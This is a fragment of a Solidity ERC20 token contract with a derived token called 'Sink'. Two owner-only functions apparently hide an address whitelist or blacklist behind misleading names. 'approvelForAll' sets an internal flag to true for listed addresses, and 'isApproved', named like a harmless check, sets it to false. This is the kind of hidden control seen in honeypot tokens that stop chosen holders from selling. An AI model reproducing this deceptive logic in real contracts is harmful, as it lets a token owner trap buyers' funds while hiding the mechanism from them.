...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function approvelForAll(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _allowance[_addresses_[i]] = true;
        }
    }

    function isApproved(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _allowance[_addresses_[i]] = false;
        }
    }

    function isApprovedForAll(address _address_) public view returns (bool) {
...
contract Sink is ERC20 {
    constructor() ERC20("SINK", "Sink") {
